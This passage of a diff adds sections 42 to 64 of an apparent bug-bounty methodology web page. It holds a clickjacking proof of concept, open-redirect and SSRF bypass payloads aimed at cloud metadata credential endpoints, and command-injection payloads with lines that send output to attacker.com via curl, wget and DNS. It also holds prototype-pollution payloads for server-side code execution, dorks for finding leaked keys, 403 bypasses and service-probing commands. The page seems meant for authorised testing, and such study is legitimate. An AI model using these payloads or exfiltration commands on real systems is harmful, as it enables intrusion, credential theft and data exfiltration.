+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;iframe src="https://example.com/x"&gt;&lt;/iframe&gt;
+&lt;!-- Full PoC --&gt;
+&lt;style&gt;
+  #target { opacity: 0.1; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+  #decoy { position: absolute; top: 100px; left: 100px; }
+&lt;/style&gt;
+&lt;div id="decoy"&gt;&lt;button&gt;Click here to win!&lt;/button&gt;&lt;/div&gt;
+&lt;iframe id="target" src="https://example.com/delete-account"&gt;&lt;/iframe&gt;</code></pre></div>
+        <div class="info-box note"><span class="info-icon">🔌</span><div>Test with Firefox Addon: <a href="https://addons.mozilla.org/en-US/firefox/addon/clickjacker/" target="_blank" rel="noopener noreferrer">Clickjacker</a></div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 43 ==================== -->
+    <section class="methodology-section" id="sec-43">
+      <div class="section-header">
+        <span class="section-num">43</span>
+        <span class="section-title">Broken Link Hijacking</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Find broken links in target
+broken-link-checker https://example.com -ro --filter-level 3
+
+# Online tools
+https://www.deadlinkchecker.com/
+https://ahrefs.com/broken-link-checker
+
+# Manual: Check social media links (@handles, /company names)
+# If Twitter/Github/etc username is freed up, register it
+
+# Check npm/pypi packages linked from app
+# Check CDN links that may have expired</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 44 ==================== -->
+    <section class="methodology-section" id="sec-44">
+      <div class="section-header">
+        <span class="section-num">44</span>
+        <span class="section-title">Open Redirect</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Common parameters
+?url=, ?redirect=, ?next=, ?return=, ?goto=, ?r=, ?target=, ?dest=, ?destination=
+
+# Basic payloads
+?next=https://attacker.com
+?next=//attacker.com
+?next=\/\/attacker.com
+?next=///attacker.com
+?next=http:attacker.com
+?next=https:attacker.com
+
+# Bypass techniques
+?next=https://example.com@attacker.com
+?next=https://attacker.com?example.com
+?next=https://attacker.com/example.com
+?next=https://example.com.attacker.com
+?next=%2F%2Fattacker.com
+?next=/%09/attacker.com
+?next=/.//attacker.com
+?next=https%3A%2F%2Fattacker.com
+
+# Protocol bypass
+?next=javascript:alert(1)
+?next=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 45 ==================== -->
+    <section class="methodology-section" id="sec-45">
+      <div class="section-header">
+        <span class="section-num">45</span>
+        <span class="section-title">SSRF (Server-Side Request Forgery)</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">Cloud Metadata Endpoints</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://[fd00:ec2::254]/latest/meta-data/   (IPv6)
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/  (with header: Metadata-Flavor: Google)
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+(with header: Metadata: true)
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Header Injection for SSRF</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">http</span><button class="copy-btn"></button></div><pre><code>X-Forwarded-For: 169.254.169.254
+X-Forwarded-Host: 169.254.169.254
+X-Real-IP: 169.254.169.254
+Client-IP: 169.254.169.254
+Referer: http://169.254.169.254/
+True-Client-IP: 169.254.169.254</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Bypass Techniques</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># URL encoding
+http://169.254.169.254  ->  http://169%2E254%2E169%2E254
+# Decimal notation
+http://2852039166/  (169.254.169.254 in decimal)
+# Hex notation
+http://0xa9fea9fe/  (169.254.169.254 in hex)
+# Octal notation
+http://025177524776/
+# IPv6
+http://[::ffff:169.254.169.254]/
+# DNS rebinding via short URL
+https://nip.io/  ->  169.254.169.254.nip.io
+# Redirection
+https://attacker.com/redirect -> 169.254.169.254</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Time-Based Blind SSRF</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Use Burp Collaborator / interactsh
+url=https://attacker-collaborator.oastify.com
+# Check for DNS/HTTP interactions to confirm SSRF</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 46 ==================== -->
+    <section class="methodology-section" id="sec-46">
+      <div class="section-header">
+        <span class="section-num">46</span>
+        <span class="section-title">Command Injection</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>ls%0awho'a'm'i
+ls%0awho"a"m"i
+who$@ami
+w\ho\am\i
+who^ami  # Windows CMD
+; id
+| id
+`id`
+$(id)
+%0a id
+%0d%0a id
+{id}
+$IFS$9id
+id;id
+id&&id
+id||id
+
+# Blind command injection
+nslookup attacker.com
+curl http://attacker.com/$(id|base64)
+wget http://attacker.com/?q=$(id|base64)
+
+# Out-of-band via DNS
+ping -c 1 $(id).attacker.com</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 47 ==================== -->
+    <section class="methodology-section" id="sec-47">
+      <div class="section-header">
+        <span class="section-num">47</span>
+        <span class="section-title">JSON Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">json</span><button class="copy-btn"></button></div><pre><code># Type juggling
+{"id": "1"}         ->  {"id": 1}
+{"id": true}        ->  {"id": 1}
+{"verified": false} ->  {"verified": true}
+
+# Parameter pollution
+{"email": "victim@x.com", "email": "attacker@x.com"}
+
+# Array injection
+{"role": "user"}    ->  {"role": ["admin", "user"]}
+{"id": 1}           ->  {"id": [1,2,3]}
+
+# Nested object injection
+{"user": {"role": "admin"}}
+
+# Null injection
+{"password": null}
+{"otp": null}
+
+# Large number overflow
+{"price": 99999999999999999999}
+{"quantity": -1}</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 48 ==================== -->
+    <section class="methodology-section" id="sec-48">
+      <div class="section-header">
+        <span class="section-num">48</span>
+        <span class="section-title">S3 Bucket Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Discovery
+# Check DNS: CNAME to s3.amazonaws.com
+# Check source code for s3 bucket names
+# Pattern: company-name.s3.amazonaws.com or s3.amazonaws.com/company-name
+
+# AWS CLI commands
+aws s3 ls s3://bucket-name --no-sign-request
+aws s3 cp s3://bucket-name/file.txt . --no-sign-request
+aws s3 sync s3://bucket-name . --no-sign-request
+
+# Check write access
+aws s3 cp test.txt s3://bucket-name/ --no-sign-request
+
+# Version enumeration (if versioning enabled)
+aws s3api list-object-versions --bucket bucket-name --no-sign-request
+
+# steghide - check for hidden data in images
+steghide extract -sf image.jpg
+
+# s3scanner
+s3scanner scan --buckets-file buckets.txt</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 49 ==================== -->
+    <section class="methodology-section" id="sec-49">
+      <div class="section-header">
+        <span class="section-num">49</span>
+        <span class="section-title">Cloud Hacking</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">Google Cloud Storage</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># GCS bucket enumeration
+gsutil ls gs://bucket-name
+gsutil cat gs://bucket-name/sensitive.txt
+gsutil ls -r gs://bucket-name/
+
+# Check public access
+curl https://storage.googleapis.com/bucket-name/
+curl https://bucket-name.storage.googleapis.com/
+
+# GCP metadata
+curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
+  -H "Metadata-Flavor: Google"</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">Azure Blob Storage</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># List blobs
+curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
+# Check for public containers at:
+# https://ACCOUNT.blob.core.windows.net/$web/</code></pre></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 50 ==================== -->
+    <section class="methodology-section" id="sec-50">
+      <div class="section-header">
+        <span class="section-num">50</span>
+        <span class="section-title">Source Code Review</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># robots.txt
+curl https://example.com/robots.txt
+
+# Parameter extraction from JS
+grep -oP '(?<=\?)[^&"'"'"'\s]+' alljs.txt
+grep -oP '([a-zA-Z_][a-zA-Z0-9_]*)=' alljs.txt
+
+# Path extraction from JS
+grep -oP '"(/[a-zA-Z0-9/_.-]+)"' alljs.txt
+
+# .NET decompilation tools
+# ILSpy: https://github.com/icsharpcode/ILSpy
+# dnSpy: https://github.com/dnSpy/dnSpy
+# dotPeek: JetBrains
+ilspycmd App.dll -o ./decompiled/
+
+# Secrets in source
+grep -rn "api_key\|apikey\|secret\|password\|token\|credential" .
+grep -rn "AWS_ACCESS\|AWS_SECRET\|PRIVATE_KEY" .
+
+# GitLeaks
+gitleaks detect --source . -v</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 51 ==================== -->
+    <section class="methodology-section" id="sec-51">
+      <div class="section-header">
+        <span class="section-num">51</span>
+        <span class="section-title">GitHub Dorking</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># GitHub search dorks
+org:example s3.amazonaws.com
+org:example "api_key"
+org:example "apiKey"
+org:example "api key"
+org:example "api-key"
+org:example "API-KEY"
+org:example "token"
+org:example "API_KEY"
+org:example "private_key"
+org:example "client_secret"
+org:example "password" filename:.env
+org:example "BEGIN RSA PRIVATE KEY"
+org:example "BEGIN EC PRIVATE KEY"
+org:example extension:pem
+org:example extension:ppk
+org:example filename:id_rsa
+org:example filename:.npmrc _auth
+org:example filename:.dockercfg
+org:example filename:credentials aws_access_key_id
+org:example filename:.bash_history
+org:example filename:.env DB_PASSWORD
+
+# Trufflehog
+trufflehog github --org=example-org
+
+# GitDorker
+python3 GitDorker.py -tf tokens.txt -q example.com -d dorks/BHIS_top_org_dorks.txt</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 52 ==================== -->
+    <section class="methodology-section" id="sec-52">
+      <div class="section-header">
+        <span class="section-num">52</span>
+        <span class="section-title">Google Dorks</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Find login pages
+site:example.com inurl:login
+site:example.com inurl:admin
+site:example.com inurl:dashboard
+
+# Find sensitive files
+site:example.com ext:pdf
+site:example.com ext:xlsx
+site:example.com ext:sql
+site:example.com ext:log
+site:example.com ext:bak
+site:example.com ext:config
+
+# Find exposed credentials
+site:example.com "password" filetype:txt
+site:example.com "api_key" filetype:json
+
+# Find subdomains
+site:*.example.com
+
+# Find exposed directories
+site:example.com intitle:"index of"
+
+# Find error pages with stack traces
+site:example.com "php warning" OR "php error" OR "fatal error"
+
+# Find test/dev environments
+site:example.com inurl:test OR inurl:dev OR inurl:staging OR inurl:beta
+
+# Pastebin leaks
+site:pastebin.com "example.com"
+site:paste.ee "example.com"
+
+# Google cache
+cache:example.com</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 53 ==================== -->
+    <section class="methodology-section" id="sec-53">
+      <div class="section-header">
+        <span class="section-num">53</span>
+        <span class="section-title">Information Disclosure</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># ServiceNow fuzzing
+ffuf -u https://instance.service-now.com/FUZZ.do -w wordlist.txt
+
+# Common info disclosure paths
+/.env
+/.env.local
+/.env.production
+/config.json
+/config.yaml
+/settings.py
+/application.properties
+/web.config
+/appsettings.json
+/.git/config
+/.svn/entries
+/server-status  (Apache)
+/server-info    (Apache)
+/nginx_status
+/phpinfo.php
+/info.php
+/test.php
+/debug
+/actuator       (Spring Boot)
+/actuator/env
+/actuator/mappings
+/actuator/health
+/actuator/logfile
+/.well-known/security.txt
+
+# Error-based disclosure
+# Trigger 500 errors with malformed input
+# Check verbose error messages for:
+# - Internal IP addresses
+# - Database connection strings  
+# - Software versions
+# - File system paths
+
+# Input limit testing (trigger length errors)
+# Send extremely long values to reveal max lengths</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 54 ==================== -->
+    <section class="methodology-section" id="sec-54">
+      <div class="section-header">
+        <span class="section-num">54</span>
+        <span class="section-title">403 Bypass</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># URL manipulation
+/admin         ->  /ADMIN
+/admin         ->  /admin/
+/admin         ->  /%61dmin
+/admin         ->  /admin%20
+/admin         ->  /admin..
+/admin         ->  /admin/.
+/admin         ->  //admin//
+/admin         ->  /./admin/./
+/admin         ->  /admin;/
+/admin         ->  /admin#
+/admin         ->  /admin?
+/admin         ->  //example.com/admin  (double slash)
+
+# Path traversal
+/api/v1/admin  ->  /api/v1/../v1/admin
+/admin         ->  /anything/../admin
+
+# Header bypasses
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+
+# HTTP method change
+GET /admin -> POST /admin -> HEAD /admin -> TRACE /admin
+
+# Technology-specific bypasses
+# Node.js - case insensitive: /ADMIN
+# Flask - trailing slash: /admin/
+# Spring Boot - semicolon: /admin;version=1
+# IIS - alternate extensions: /admin.aspx -> /admin.aSPx</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 55 ==================== -->
+    <section class="methodology-section" id="sec-55">
+      <div class="section-header">
+        <span class="section-num">55</span>
+        <span class="section-title">Shodan &amp; Recon</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Shodan dorks
+org:"Company Name"
+ssl:"Company Name"
+hostname:example.com
+http.title:"Dashboard"
+http.title:"Admin Panel"
+http.html:"powered by"
+http.favicon.hash:HASH_VALUE
+asn:AS12345
+net:192.168.1.0/24
+port:8443 product:Apache
+product:Microsoft-IIS
+
+# Shodan CLI
+shodan init API_KEY
+shodan search --fields ip_str,port,org "hostname:example.com"
+shodan host 1.2.3.4
+
+# hunter.how
+https://hunter.how/
+
+# Favicon hash calculation (mmh3)
+python3 -c "import mmh3,requests,base64; r=requests.get('https://example.com/favicon.ico'); print(mmh3.hash(base64.encodebytes(r.content)))"
+
+# uncover tool
+uncover -q "org:\"Example Inc\"" -e shodan,censys,fofa,quake,hunter,zoomeye
+uncover -q "ssl:\"example.com\" port:443"
+
+# Censys
+https://search.censys.io/
+# ZoomEye
+https://www.zoomeye.org/
+# FOFA
+https://fofa.info/</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 56 ==================== -->
+    <section class="methodology-section" id="sec-56">
+      <div class="section-header">
+        <span class="section-num">56</span>
+        <span class="section-title">Prototype Pollution</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>subfinder -d target.com | httpx -silent | \
+  sed 's/$/\/?__proto__[testparam]=exploit\//' | \
+  page-fetch -j 'window.testparam=="exploit"?"[VULN]":"[NOT]"' | \
+  sed "s/(//g" | sed "s/)//g" | sed "s/JS//g" | grep "VULN"</code></pre></div>
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">javascript</span><button class="copy-btn"></button></div><pre><code>// Detection payloads
+?__proto__[admin]=true
+?__proto__[isAdmin]=true
+?constructor.prototype.admin=true
+
+// DOM clobbering via prototype pollution
+Object.prototype.innerHTML = '&lt;img src=1 onerror=alert(1)&gt;';
+
+// Server-side prototype pollution (Node.js)
+{"__proto__": {"NODE_OPTIONS": "--require /proc/self/fd/0","NODE_PATH": "/proc/self/fd/0"}}
+{"constructor": {"prototype": {"shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0:1337"}}}</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 57 ==================== -->
+    <section class="methodology-section" id="sec-57">
+      <div class="section-header">
+        <span class="section-num">57</span>
+        <span class="section-title">Port Scanning &amp; Service Exploitation</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># nmap
+nmap -sV -sC -p- --open target.com
+nmap -sV -sC -p 21,22,23,25,53,80,443,3306,3389,8080,8443 target.com
+nmap --script=vuln target.com
+
+# Service exploitation
+# MySQL (3306)
+mysql -h target.com -u root -p  (try blank password)
+nmap -p 3306 --script mysql-info,mysql-brute target.com
+
+# MongoDB (27017)
+mongo target.com --eval "db.adminCommand({listDatabases:1})"
+
+# LDAP (389/636)
+ldapsearch -x -H ldap://target.com -b "" -s base
+
+# SMTP (25)
+nc target.com 25
+EHLO test
+VRFY admin@target.com  # User enumeration
+
+# NFS (2049)
+showmount -e target.com
+mount -t nfs target.com:/share /mnt/
+
+# rsync (873)
+rsync rsync://target.com/
+rsync -av rsync://target.com/share ./
+
+# POP3 (110)
+nc target.com 110
+USER admin
+PASS password
+
+# Telnet (23)
+telnet target.com 23
+
+# Important ports
+# 21 FTP  22 SSH  23 Telnet  25 SMTP  53 DNS
+# 80 HTTP  443 HTTPS  3306 MySQL  5432 PostgreSQL
+# 27017 MongoDB  6379 Redis  9200 Elasticsearch
+# 8080/8443 Web  3389 RDP  5900 VNC</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 58 ==================== -->
+    <section class="methodology-section" id="sec-58">
+      <div class="section-header">
+        <span class="section-num">58</span>
+        <span class="section-title">DoS Techniques</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="info-box danger"><span class="info-icon">⚠️</span><div>Only test DoS vulnerabilities on programs that explicitly allow it. Never perform actual DoS attacks.</div></div>
+        <ul>
+          <li><strong>ReDoS:</strong> Supply regex-triggering input to slow regex operations. Test with long strings of repeating characters.</li>
+          <li><strong>Large file upload:</strong> Upload max-size files to consume storage/bandwidth</li>
+          <li><strong>Zip bomb:</strong> Upload a compressed file that expands to huge size</li>
+          <li><strong>XML bomb (Billion Laughs):</strong> Deeply nested XML entities</li>
+          <li><strong>Algorithmic complexity:</strong> Trigger O(n²) or worse operations</li>
+          <li><strong>Pixel flood:</strong> Upload 1x1 PNG claiming to be 50000x50000</li>
+          <li><strong>Long password DoS:</strong> bcrypt slows with very long passwords — send 1MB password</li>
+          <li><strong>Rate limiting absence:</strong> Demonstrate missing rate limits without actually causing DoS</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 59 ==================== -->
+    <section class="methodology-section" id="sec-59">
+      <div class="section-header">
+        <span class="section-num">59</span>
+        <span class="section-title">Android APK Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Decompilation
+apktool d app.apk -o ./decompiled/
+jadx-gui app.apk &
+unzip app.apk -d ./apk_contents/
+d2j-dex2jar app.apk -o app.jar
+
+# MobSF - automated analysis
+# https://github.com/MobSF/Mobile-Security-Framework-MobSF
+docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
+
+# Source code review targets
+grep -rn "api_key\|secret\|password\|token" ./decompiled/
+grep -rn "http://\|ftp://" ./decompiled/
+grep -rn "allowBackup\|debuggable" ./decompiled/AndroidManifest.xml
+
+# IP/URL extraction
+grep -oP "https?://[a-zA-Z0-9./?=_%&#@!-]+" ./decompiled/ -r
+grep -oP "\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b" ./decompiled/ -r
+
+# Key extraction regex
+grep -oP "[a-zA-Z0-9+/]{40,}={0,2}" ./decompiled/ -r</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 60 ==================== -->
+    <section class="methodology-section" id="sec-60">
+      <div class="section-header">
+        <span class="section-num">60</span>
+        <span class="section-title">Roles &amp; Privilege Escalation</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <ul>
+          <li><strong>Horizontal Escalation:</strong> User A accesses User B's data (same privilege level)</li>
+          <li><strong>Vertical Escalation:</strong> Regular user accesses admin functions</li>
+          <li><strong>Role parameter manipulation:</strong> <code>{"role":"user"}</code> → <code>{"role":"admin"}</code></li>
+          <li><strong>Forced browsing:</strong> Access /admin, /superuser, /moderator paths directly</li>
+          <li><strong>Cookie manipulation:</strong> Decode and modify role claims in cookies</li>
+          <li><strong>Mass assignment:</strong> Include admin flag in registration/update body</li>
+          <li><strong>Endpoint enumeration:</strong> Find API endpoints documented for admins but lacking access control</li>
+        </ul>
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Autorize Burp extension for automatic access control testing
+# Add admin cookie to "Header(s) of user with lower privileges" field
+# Use admin account to browse all features
+# Autorize replays each request with lower privilege cookie
+# Color coding: Bypassed! = vulnerability found</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 61 ==================== -->
+    <section class="methodology-section" id="sec-61">
+      <div class="section-header">
+        <span class="section-num">61</span>
+        <span class="section-title">HTTP Methods Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># OPTIONS request to find allowed methods
+curl -X OPTIONS https://example.com/ -I
+
+# Test all HTTP methods with Burp Intruder
+# Payload: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS, TRACE, CONNECT
+
+# Method-based bypass
+# If POST /admin is 403, try PUT /admin, PATCH /admin
+# X-HTTP-Method-Override header
+X-HTTP-Method-Override: DELETE
+X-Method-Override: DELETE
+X-Override: DELETE
+
+# TRACE method (may reveal proxy headers / XST)
+curl -X TRACE https://example.com/</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 62 ==================== -->
+    <section class="methodology-section" id="sec-62">
+      <div class="section-header">
+        <span class="section-num">62</span>
+        <span class="section-title">Lack of Security Controls</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <ul>
+          <li><strong>Lack of Password Confirmation:</strong> Change email/password without entering current password</li>
+          <li><strong>Lack of Email Verification:</strong> Register with someone else's email and gain access</li>
+          <li><strong>Mail Bombing:</strong> No rate limit on email sending — trigger mass emails to victim</li>
+          <li><strong>Missing HTTPS:</strong> Sensitive data transmitted over HTTP</li>
+          <li><strong>Insecure Direct Object Reference:</strong> Access other users' resources via ID manipulation</li>
+          <li><strong>No Account Lockout:</strong> Unlimited password guessing attempts allowed</li>
+          <li><strong>Sensitive Data Exposure:</strong> PII, credit cards, passwords in API responses</li>
+          <li><strong>Missing Security Headers:</strong> No CSP, HSTS, X-Frame-Options, X-Content-Type-Options</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 63 ==================== -->
+    <section class="methodology-section" id="sec-63">
+      <div class="section-header">
+        <span class="section-num">63</span>
+        <span class="section-title">SSL/TLS Issues</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># testssl.sh
+testssl.sh https://example.com
+
+# sslscan
+sslscan example.com
+
+# nmap TLS scripts
+nmap -p 443 --script ssl-enum-ciphers example.com
+
+# Check TLS version support (SSLv2/v3/TLS1.0/1.1 = outdated)
+# Check for weak cipher suites (RC4, 3DES, MD5)
+# Check for POODLE, BEAST, CRIME, BREACH, DROWN, Heartbleed
+# Check certificate: expiry, self-signed, hostname mismatch</code></pre></div>
+        <div class="info-box note"><span class="info-icon">🦊</span><div>Firefox TLS configuration fix: In Firefox, go to <code>about:config</code> and set <code>security.tls.version.min</code> to <code>1</code> to test against TLS 1.0/1.1 endpoints.</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 64 ==================== -->
+    <section class="methodology-section" id="sec-64">
+      <div class="section-header">
+        <span class="section-num">64</span>
+        <span class="section-title">Useful Resources &amp; Tools</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">Documentation &amp; Note-Taking</div>
+          <ul>
+            <li><a href="https://obsidian.md/" target="_blank" rel="noopener noreferrer">Obsidian</a> — Knowledge management for bug bounty notes</li>
+            <li><a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a> — Comprehensive hacking techniques wiki</li>
+            <li><a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">PortSwigger Web Academy</a> — Free web security training</li>
+          </ul>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">Exploit Databases</div>
+          <ul>
+            <li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">Exploit-DB</a> — Public exploits and vulnerable software</li>
+            <li><a href="https://packetstormsecurity.com/" target="_blank" rel="noopener noreferrer">Packet Storm Security</a></li>
+            <li><a href="https://vulners.com/" target="_blank" rel="noopener noreferrer">Vulners</a> — Vulnerability database</li>
+            <li><a href="https://cve.mitre.org/" target="_blank" rel="noopener noreferrer">CVE Mitre</a></li>
+          </ul>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">Bug Bounty Platforms</div>
+          <ul>
+            <li><a href="https://hackerone.com/" target="_blank" rel="noopener noreferrer">HackerOne</a></li>
+            <li><a href="https://bugcrowd.com/" target="_blank" rel="noopener noreferrer">Bugcrowd</a></li>
+            <li><a href="https://intigriti.com/" target="_blank" rel="noopener noreferrer">Intigriti</a></li>
+            <li><a href="https://yeswehack.com/" target="_blank" rel="noopener noreferrer">YesWeHack</a></li>
+            <li><a href="https://www.synack.com/" target="_blank" rel="noopener noreferrer">Synack Red Team</a></li>
+          </ul>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">Essential Tool Repositories</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code>https://github.com/projectdiscovery/nuclei
+https://github.com/projectdiscovery/subfinder
+https://github.com/projectdiscovery/httpx
+https://github.com/ffuf/ffuf
+https://github.com/sqlmapproject/sqlmap
+https://github.com/aboul3la/Sublist3r
+https://github.com/OWASP/Amass
+https://github.com/swisskyrepo/PayloadsAllTheThings
+https://github.com/danielmiessler/SecLists
+https://github.com/nicowillis/recon-methodology
+https://github.com/1ndianl33t/Bug-Bounty-Roadmaps</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">Wordlists</div>
+          <ul>
+            <li><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">SecLists</a> — Most comprehensive wordlist collection</li>
+            <li><a href="https://github.com/assetnote/commonspeak2" target="_blank" rel="noopener noreferrer">Commonspeak2</a> — Content-discovery wordlists from BigQuery</li>
